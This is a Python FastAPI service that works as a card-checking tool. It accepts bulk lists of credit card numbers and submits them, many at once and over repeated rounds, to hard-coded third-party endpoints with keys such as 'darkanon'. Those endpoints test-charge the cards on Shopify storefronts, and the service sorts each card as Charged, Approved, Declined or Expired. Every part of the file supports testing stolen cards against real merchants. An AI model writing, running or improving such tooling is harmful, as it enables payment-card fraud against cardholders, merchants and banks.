from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
import aiohttp
import asyncio
import os
import random
import json

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SHOPIFY_APIS = {
    "api1": {"url": "https://api-production-6b6d.up.railway.app/shopify", "key": "darkanon"},
    "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
}

@app.post("/check")
async def check_cards(data: dict):
    cards = data.get("cards", [])
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    sites = data.get("sites", [])
    max_rounds = data.get("max_rounds", 3)
    batch_size = data.get("batch_size", 100)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    
    if not sites:
        sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
    
    # Take only 8 sites max
    sites = sites[:8]
    
    async def generate():
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        
        sem = asyncio.Semaphore(concurrency)
        batch = []
        checked = 0
        charged = 0
        approved = 0
        dead = 0
        
        async def worker():
            nonlocal checked, charged, approved, dead, batch
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                while not queue.empty():
                    try:
                        card = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                    
                    async with sem:
                        result = await check_card_fast(session, api, card, sites, max_rounds)
                        batch.append(result)
                        checked += 1
                        if result["status"] == "Charged":
                            charged += 1
                        elif result["status"] == "Approved":
                            approved += 1
                        elif result["status"] in ["Declined", "Expired"]:
                            dead += 1
                    
                    queue.task_done()
                    
                    # Send batch every 100 cards
                    if len(batch) >= batch_size:
                        yield json.dumps({
                            "type": "batch",
                            "results": batch,
                            "checked": checked,
                            "charged": charged,
                            "approved": approved,
                            "dead": dead
                        }) + "\n"
                        batch = []
        
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
        await asyncio.gather(*workers)
        
        # Send remaining
        if batch:
            yield json.dumps({
                "type": "batch",
                "results": batch,
                "checked": checked,
                "charged": charged,
                "approved": approved,
                "dead": dead
            }) + "\n"
        
        # Send final summary
        yield json.dumps({
            "type": "done",
            "total": checked,
            "charged": charged,
            "approved": approved,
            "dead": dead
        }) + "\n"
    
    return StreamingResponse(generate(), media_type="application/x-ndjson")

@app.post("/check_old")
async def check_cards_old(data: dict):
    """Old non-streaming endpoint for backward compatibility"""
    cards = data.get("cards", [])
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)
    sites = data.get("sites", [])
    max_rounds = data.get("max_rounds", 3)
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    if not sites:
        sites = [{"url": "https://the-butterfly-pig-dev.myshopify.com", "price": 1.0}]
    sites = sites[:8]
    
    results = []
    checked = 0
    charged = 0
    approved = 0
    dead = 0
    
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)
    
    sem = asyncio.Semaphore(concurrency)
    
    async def worker():
        nonlocal checked, charged, approved, dead
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while not queue.empty():
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                async with sem:
                    result = await check_card_fast(session, api, card, sites, max_rounds)
                    results.append(result)
                    checked += 1
                    if result["status"] == "Charged": charged += 1
                    elif result["status"] == "Approved": approved += 1
                    elif result["status"] in ["Declined", "Expired"]: dead += 1
                queue.task_done()
    
    workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, len(cards)))]
    await asyncio.gather(*workers)
    
    return {"results": results, "total": len(results), "checked": checked, "charged": charged, "approved": approved, "dead": dead}

async def check_card_fast(session, api, card, sites, max_rounds=3):
    for round_num in range(max_rounds):
        shuffled = list(sites)
        random.shuffle(shuffled)
        for site_obj in shuffled:
            site_url = site_obj.get("url", site_obj) if isinstance(site_obj, dict) else site_obj
            try:
                url = f"{api['url']}?site={site_url}&cc={card}&key={api['key']}"
                async with session.get(url) as resp:
                    text = await resp.text()
                    try:
                        data = json.loads(text)
                        response_text = data.get('Response', text).lower()
                    except:
                        response_text = text.lower()
                    if 'charged' in response_text and 'no_product' not in response_text:
                        return {"card": card, "status": "Charged", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url}
                    elif 'approved' in response_text:
                        return {"card": card, "status": "Approved", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url}
                    elif 'expired' in response_text:
                        return {"card": card, "status": "Expired", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url}
                    elif 'card_declined' in response_text or 'declined' in response_text:
                        return {"card": card, "status": "Declined", "message": text[:500], "gateway": "Shopify", "price": extract_price(text), "site": site_url}
            except:
                continue
    return {"card": card, "status": "Declined", "message": "All sites returned NO_PRODUCT", "gateway": "Shopify", "price": "-"}

def extract_price(text):
    import re
    prices = re.findall(r'\$(\d+\.?\d*)', text)
    return prices[0] if prices else "-"

@app.get("/health")
async def health():
    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
